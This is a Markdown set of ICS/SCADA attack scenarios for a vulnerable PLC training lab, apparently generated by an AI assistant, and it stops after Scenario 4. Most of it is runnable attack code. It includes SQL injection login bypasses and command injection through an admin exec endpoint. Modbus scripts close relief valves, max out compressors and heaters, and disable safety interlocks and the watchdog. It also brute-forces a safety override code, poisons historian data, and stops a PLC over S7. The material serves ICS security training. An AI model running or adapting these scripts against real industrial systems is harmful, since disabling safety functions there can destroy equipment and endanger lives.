# ICS/SCADA Attack Scenarios & CTF Challenges

## Overview

This document provides detailed attack scenarios against the vulnerable PLC environment. Each scenario demonstrates real-world ICS cyber-attack techniques used by threat actors like Sandworm, Triton/Trisis, and others.

**WARNING:** These scenarios are for authorized testing and education only.

---

## Table of Contents

1. [Scenario 1: Complete Compromise via Web Exploitation](#scenario-1-complete-compromise-via-web-exploitation)
2. [Scenario 2: Direct Modbus Manipulation](#scenario-2-direct-modbus-manipulation)
3. [Scenario 3: Historian Poisoning](#scenario-3-historian-poisoning)
4. [Scenario 4: Safety System Bypass](#scenario-4-safety-system-bypass)
5. [Scenario 5: Multi-Stage APT](#scenario-5-multi-stage-apt)
6. [Scenario 6: Denial-of-View Attack](#scenario-6-denial-of-view-attack)
7. [Scenario 7: Denial-of-Control Attack](#scenario-7-denial-of-control-attack)
8. [Scenario 8: Firmware Backdoor](#scenario-8-firmware-backdoor)
9. [Scenario 9: Network Pivot](#scenario-9-network-pivot)
10. [Scenario 10: Insider Threat](#scenario-10-insider-threat)

---

## Docker Deployment Attack Scenarios

### Using Docker for Realistic Network Attacks

With the Docker deployment, you can perform more realistic network-based attacks that simulate real-world ICS environments with proper network segmentation.

#### Setup: Start Docker Environment

```bash
# Start core services
docker-compose up -d

# Or start with full monitoring (IDS, Network Sim, S7)
docker-compose --profile full up -d

# Verify all containers are running
docker-compose ps
```

#### Docker Attack Scenario 1: Cross-Container Attack

**Objective:** Attack from one PLC to another within the OT network

```bash
# Enter PLC-1 container
docker-compose exec plc1 bash

# From inside PLC-1, scan the OT network
nmap -sn 192.168.100.0/24

# Attack PLC-2 from inside PLC-1 (lateral movement)
python3 -c "
from pymodbus.client.sync import ModbusTcpClient
client = ModbusTcpClient('192.168.100.11', port=5503)
client.write_register(10, 9999)  # Unauthorized write
client.close()
"

# Check IDS alerts (if running with --profile full)
docker-compose logs modbus_ids | grep ALERT
```

#### Docker Attack Scenario 2: Network Segmentation Bypass

**Objective:** Pivot from DMZ to OT network

```bash
# The Historian is dual-homed (both DMZ and OT networks)
# This simulates a common misconfiguration

# Enter Historian container
docker-compose exec historian bash

# You're now in the DMZ with access to OT network
# Scan OT network from Historian
ping -c 1 192.168.100.10  # PLC-1
ping -c 1 192.168.100.11  # PLC-2

# Attack PLCs from Historian
modbus write 192.168.100.10:5502 0 1
```

#### Docker Attack Scenario 3: PCAP Forensics Practice

**Objective:** Perform attack while capturing traffic, then analyze

```bash
# Start full environment with IDS
docker-compose --profile full up -d

# Perform attacks (flooding, unauthorized writes)
for i in {1..100}; do
  sudo modbus 127.0.0.1:5502 read $i 1
done

# Wait a moment for PCAP to be written
sleep 5

# Copy PCAP from IDS container
docker cp vuln-modbus-ids:/app/pcaps/ ./captured_traffic/

# Analyze with Wireshark or tcpdump
wireshark captured_traffic/*.pcap
# or
tcpdump -r captured_traffic/*.pcap -nn 'port 502'
```

#### Docker Attack Scenario 4: S7 Protocol Exploitation

**Objective:** Exploit S7 protocol (if running with --profile full)

```bash
# Install snap7 library
pip install python-snap7

# Connect to S7 server
python3 << 'EOF'
import snap7

# Connect (no authentication!)
plc = snap7.client.Client()
plc.connect('localhost', 0, 1, 102)

print(f"Connected. PLC State: {plc.get_cpu_state()}")

# Read data block
data = plc.db_read(1, 0, 10)
print(f"Read DB1: {data.hex()}")

# Write to data block
plc.db_write(1, 0, bytearray([0xFF, 0xFF]))

# CRITICAL: Stop PLC (no auth required!)
plc.plc_stop()
print("PLC stopped!")

plc.disconnect()
EOF
```

#### Docker Attack Scenario 5: Container Escape

**Objective:** Attempt container escape (educational)

```bash
# Enter any container
docker-compose exec plc1 bash

# Check container capabilities
capsh --print

# Try to access host
ls /proc/1/root/

# Note: Containers should be properly isolated
# This demonstrates why container security matters
```

#### Monitoring Attacks in Docker

**View real-time System Monitor dashboard:**
```bash
# Open browser to http://localhost:5999
# Watch live metrics during attacks
```

**View IDS alerts:**
```bash
docker-compose logs -f modbus_ids
```

**View physical process consequences:**
```bash
docker-compose logs -f physical_process
# Watch for overflow, rupture, thermal runaway alerts
```

---

## Scenario 1: Complete Compromise via Web Exploitation

**Objective:** Gain full control of all PLCs through web application vulnerabilities

**Difficulty:** ★★☆☆☆ (Beginner)

**Attack Chain:**

### Phase 1: Reconnaissance
```bash
# Port scan
nmap -sV -p- localhost

# Find web interfaces
# PLC-1: http://localhost:5000
# PLC-2: http://localhost:5011
# PLC-3: http://localhost:5012
# PLC-4: http://localhost:5013
```

### Phase 2: SQL Injection
```bash
# Test SQL injection on PLC-1
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1&password=x" \
  -c cookies.txt -L

# Expected: Successful bypass, logged in as admin
```

### Phase 3: Command Injection
```bash
# Access admin panel
curl http://localhost:5000/admin -b cookies.txt

# Execute system commands
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=whoami"

# Expected output: Current user

curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=ls -la"
```

### Phase 4: Network Scanning from Compromised Host
```bash
# Scan internal network
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=nmap -sn 192.168.100.0/24"

# Discover all PLCs and devices
```

### Phase 5: Lateral Movement
```bash
# Download Modbus tools
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=pip install pymodbus"

# Write Python script to manipulate PLCs
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=cat > attack.py << 'EOF'
from pymodbus.client.sync import ModbusTcpClient

# Connect to PLC-2
client = ModbusTcpClient('localhost', port=5503)

# Set pressure to dangerous level
client.write_register(0, 1800)  # 180.0 PSI (exceeds 150 PSI limit)

client.close()
print('Attack executed')
EOF"

# Execute attack
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=python attack.py"
```

### Success Criteria:
- ✓ Bypassed authentication
- ✓ Gained command execution
- ✓ Scanned internal network
- ✓ Manipulated PLC process values
- ✓ Triggered safety alarms

### Flags to Capture:
1. Admin session cookie value
2. Contents of /etc/passwd
3. IP addresses of all PLCs
4. Current pressure value of PLC-2 vessel 1
5. Safety override code from PLC-4

---

## Scenario 2: Direct Modbus Manipulation

**Objective:** Manipulate industrial process without web interface

**Difficulty:** ★★★☆☆ (Intermediate)

**Attack Chain:**

### Phase 1: Modbus Discovery
```bash
# Scan for Modbus devices
nmap --script modbus-discover -p 5502-5505 localhost

# Expected: 4 PLCs discovered
```

### Phase 2: Read All Registers
```python
#!/usr/bin/env python3
from pymodbus.client.sync import ModbusTcpClient

def scan_plc(host, port, plc_name):
    print(f"\n[*] Scanning {plc_name} at {host}:{port}")
    client = ModbusTcpClient(host, port=port)

    # Read holding registers
    try:
        result = client.read_holding_registers(0, 100)
        if result:
            print(f"[+] Holding Registers: {result.registers[:20]}")
    except Exception as e:
        print(f"[-] Error reading holding registers: {e}")

    # Read input registers
    try:
        result = client.read_input_registers(0, 100)
        if result:
            print(f"[+] Input Registers: {result.registers[:20]}")
    except Exception as e:
        print(f"[-] Error reading input registers: {e}")

    # Read coils
    try:
        result = client.read_coils(0, 100)
        if result:
            print(f"[+] Coils: {result.bits[:20]}")
    except Exception as e:
        print(f"[-] Error reading coils: {e}")

    client.close()

# Scan all PLCs
scan_plc('localhost', 5502, 'PLC-1')
scan_plc('localhost', 5503, 'PLC-2')
scan_plc('localhost', 5504, 'PLC-3')
scan_plc('localhost', 5505, 'PLC-4')
```

### Phase 3: Manipulate Process Values
```python
#!/usr/bin/env python3
from pymodbus.client.sync import ModbusTcpClient
import time

def attack_pressure_system():
    """Cause pressure vessel overpressure"""
    client = ModbusTcpClient('localhost', port=5503)

    print("[*] Attacking PLC-2 Pressure System")

    # Turn on both compressors at max speed
    client.write_coil(0, True)   # Compressor 1 ON
    client.write_coil(1, True)   # Compressor 2 ON
    client.write_register(1, 100) # Compressor 1 speed 100%
    client.write_register(21, 100) # Compressor 2 speed 100%

    # Disable relief valves
    client.write_coil(2, False)  # Relief valve 1 CLOSED
    client.write_coil(3, False)  # Relief valve 2 CLOSED

    print("[+] Compressors ON, relief valves CLOSED")
    print("[!] Pressure will rise dangerously!")

    # Monitor pressure
    for i in range(30):
        result = client.read_input_registers(0, 2)
        if result:
            pressure1 = result.registers[0] / 10.0
            pressure2 = result.registers[1] / 10.0
            print(f"[{i}] Vessel 1: {pressure1} PSI, Vessel 2: {pressure2} PSI")

            if pressure1 > 150 or pressure2 > 150:
                print("[!!!] CRITICAL PRESSURE EXCEEDED!")
                break

        time.sleep(1)

    client.close()

def attack_temperature_system():
    """Cause thermal runaway"""
    client = ModbusTcpClient('localhost', port=5504)

    print("[*] Attacking PLC-3 Temperature System")

    # Turn on all heaters at max power
    client.write_coil(0, True)  # Heater 1 ON
    client.write_coil(1, True)  # Heater 2 ON
    client.write_coil(2, True)  # Heater 3 ON
    client.write_register(2, 100)  # Heater 1 power 100%
    client.write_register(22, 100) # Heater 2 power 100%
    client.write_register(42, 100) # Heater 3 power 100%

    # Disable coolers
    client.write_coil(3, False) # Cooler 1 OFF
    client.write_coil(4, False) # Cooler 2 OFF
    client.write_coil(5, False) # Cooler 3 OFF

    # Trigger thermal runaway
    client.write_coil(10, True) # Enable thermal runaway mode

    print("[+] All heaters ON at 100%, coolers OFF")
    print("[!] Thermal runaway initiated!")

    client.close()

# Execute attacks
attack_pressure_system()
attack_temperature_system()
```

### Phase 4: Safety System Compromise
```python
#!/usr/bin/env python3
from pymodbus.client.sync import ModbusTcpClient

def bypass_safety_system():
    """Disable safety interlocks"""
    client = ModbusTcpClient('localhost', port=5505)

    print("[*] Attacking PLC-4 Safety System")

    # Write safety override code
    client.write_register(2, 1234)  # Override code

    # Enable safety bypass
    client.write_coil(40, True)  # Safety bypass mode

    # Disable watchdog
    client.write_coil(41, False) # Watchdog disabled

    # Disable safety interlocks
    client.write_coil(10, False) # Interlock 1 disabled
    client.write_coil(11, False) # Interlock 2 disabled
    client.write_coil(12, False) # Interlock 3 disabled

    print("[+] Safety system BYPASSED!")
    print("[!!!] All safety interlocks disabled!")

    client.close()

bypass_safety_system()
```

### Success Criteria:
- ✓ Successfully scanned all 4 PLCs
- ✓ Read process values via Modbus
- ✓ Manipulated pressure system
- ✓ Triggered thermal runaway
- ✓ Bypassed safety system

### Flags to Capture:
1. Initial pressure value of vessel 1
2. Temperature of zone 1 after 30 seconds
3. Safety override code
4. Number of active alarms after attack
5. Watchdog counter value

---

## Scenario 3: Historian Poisoning

**Objective:** Inject false data to hide attack or cause confusion

**Difficulty:** ★★★☆☆ (Intermediate)

**Attack Chain:**

### Phase 1: Access Historian
```bash
# SQL injection on historian login
curl -X POST http://localhost:8888/login \
  -d "username=historian' OR '1'='1&password=x" \
  -c hist_cookies.txt -L
```

### Phase 2: Inject False Data
```python
#!/usr/bin/env python3
import requests
import datetime

# Inject normal-looking data to hide attack
def inject_fake_data():
    url = 'http://localhost:8888/api/inject'

    # Inject false "normal" pressure readings
    # While actual pressure is dangerously high
    for i in range(100):
        timestamp = (datetime.datetime.now() - datetime.timedelta(seconds=i*5)).strftime('%Y-%m-%d %H:%M:%S')

        data = {
            'timestamp': timestamp,
            'plc_id': 2,
            'tag_name': 'pressure_vessel_1',
            'value': 105.0,  # Normal value (actual is 180+!)
            'quality': 'GOOD'
        }

        response = requests.post(url, json=data)
        print(f"Injected fake data: {timestamp} = 105.0 PSI")

inject_fake_data()
```

### Phase 3: Denial-of-View
```python
#!/usr/bin/env python3
import requests

# Flood historian with garbage data
def denial_of_view():
    url = 'http://localhost:8888/api/inject'

    # Inject thousands of fake entries
    for i in range(10000):
        data = {
            'plc_id': 1,
            'tag_name': f'fake_tag_{i}',
            'value': 0.0,
            'quality': 'BAD'
        }
        requests.post(url, json=data)

    print("[+] Historian flooded with 10,000 fake entries")
    print("[!] Legitimate data now buried!")

denial_of_view()
```

### Success Criteria:
- ✓ Gained historian access
- ✓ Injected false normal values
- ✓ Flooded database with fake data
- ✓ HMI shows false "safe" readings

### Flags to Capture:
1. Historian admin session token
2. Number of legitimate vs fake entries
3. SQL injection payload used
4. Actual vs reported pressure value

---

## Scenario 4: Safety System Bypass

**Objective:** Disable safety interlocks and cause dangerous condition

**Difficulty:** ★★★★☆ (Advanced)

**Attack Chain:**

### Phase 1: Timing Attack on Authentication
```python
#!/usr/bin/env python3
import requests
import time

def timing_attack():
    """Enumerate valid usernames via timing attack"""
    url = 'http://localhost:5013/login'

    test_users = ['admin', 'engineer', 'safety_eng', 'operator', 'guest', 'invalid']

    print("[*] Performing timing attack to enumerate users...")

    for username in test_users:
        times = []

        for _ in range(5):
            start = time.time()
            requests.post(url, data={'username': username, 'password': 'wrongpass'})
            elapsed = time.time() - start
            times.append(elapsed)

        avg_time = sum(times) / len(times)
        print(f"{username}: {avg_time:.4f}s")

        if avg_time > 0.2:
            print(f"  [+] Valid username: {username}")

timing_attack()
```

### Phase 2: Brute Force Override Code
```python
#!/usr/bin/env python3
import requests

def brute_force_override():
    """Brute force 4-digit safety override code"""
    session = requests.Session()

    # Login first
    session.post('http://localhost:5013/login', data={
        'username': 'safety_eng',
        'password': 'safe123'
    })

    # Brute force override code
    for code in range(1000, 9999):
        response = session.post('http://localhost:5013/api/safety_override',
                               data={'code': str(code)})

        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                print(f"[+] Override code found: {code}")
                return code

        if code % 100 == 0:
            print(f"[*] Tried {code} codes...")

    return None

code = brute_force_override()
print(f"[+] Safety override code: {code}")
```

### Phase 3: Disable All Safety Systems
```python
#!/usr/bin/env python3
from pymodbus.client.sync import ModbusTcpClient
import requests

def complete_safety_bypass():
    session = requests.Session()

    # Login to PLC-4
    session.post('http://localhost:5013/login', data={
        'username': 'admin',
        'password': 'admin'
    })

    # Submit override code
    session.post('http://localhost:5013/api/safety_override',
                data={'code': '1234'})

    # Enable bypass via web interface
    session.post('http://localhost:5013/api/control',
                json={'action': 'safety_bypass_mode', 'value': True})

    # Also disable via Modbus (redundant attack)
    client = ModbusTcpClient('localhost', port=5505)

    # Write override code
    client.write_register(2, 1234)

    # Enable bypass
    client.write_coil(40, True)

    # Disable watchdog
    client.write_coil(41, False)

    # Disable all interlocks
    client.write_coil(10, False)
    client.write_coil(11, False)
    client.write_coil(12, False)

    print("[+++] SAFETY SYSTEM COMPLETELY BYPASSED!")
    print("[!!!] No safety protections remain!")

    client.close()

complete_safety_bypass()
```

### Phase 4: Trigger Catastrophic Failure
```python
#!/usr/bin/env python3
from pymodbus.client.sync import ModbusTcpClient
import time

def trigger_catastrophic_failure():
    """With safety bypassed, cause multiple failures"""

    # Attack PLC-2: Overpressure
    plc2 = ModbusTcpClient('localhost', port=5503)
    plc2.write_coil(0, True)  # Compressor 1 ON
    plc2.write_coil(1, True)  # Compressor 2 ON
    plc2.write_register(1, 100)  # Max speed
    plc2.write_register(21, 100)
    plc2.close()

    # Attack PLC-3: Overheat
    plc3 = ModbusTcpClient('localhost', port=5504)
    plc3.write_coil(0, True)  # All heaters ON
    plc3.write_coil(1, True)
    plc3.write_coil(2, True)
    plc3.write_register(2, 100)  # Max power
    plc3.write_register(22, 100)
    plc3.write_register(42, 100)
    plc3.write_coil(10, True)  # Thermal runaway
    plc3.close()

    # Attack PLC-1: Tank overflow
    plc1 = ModbusTcpClient('localhost', port=5502)
    plc1.write_coil(0, True)  # Pumps ON
    plc1.write_coil(1, True)
    plc1.write_coil(10, False)  # Valves CLOSED
    plc1.close()

    print("[!!!] CATASTROPHIC FAILURE INITIATED")
    print("  - Pressure vessels overpressurized")
    print("  - Thermal runaway in progress")
    print("  - Tank overflowing")
    print("  - Safety systems bypassed")
    print("  - NO AUTOMATIC SHUTDOWN POSSIBLE")

    # Safety system should activate, but won't due to bypass
    time.sleep(10)

    print("[!!!] In real system, this would cause:")
    print("  - Equipment destruction")
    print("  - Toxic chemical release")
    print("  - Potential explosions")
    print("  - Environmental damage")
    print("  - LOSS OF LIFE")

trigger_catastrophic_failure()
```

### Success Criteria:
- ✓ Enumerated valid usernames
- ✓ Brute forced override code
- ✓ Bypassed safety system
- ✓ Triggered multiple failures
- ✓ Safety system unable to respond

### Flags to Capture:
1. Valid usernames found via timing attack
2. Safety override code
3. State of safety bypass mode
4. Number of critical alarms
5. Watchdog status

---

## [Continued in next message...]

Would you like me to continue with the remaining scenarios (5-10) and then create the Detection Playbook for defenders?

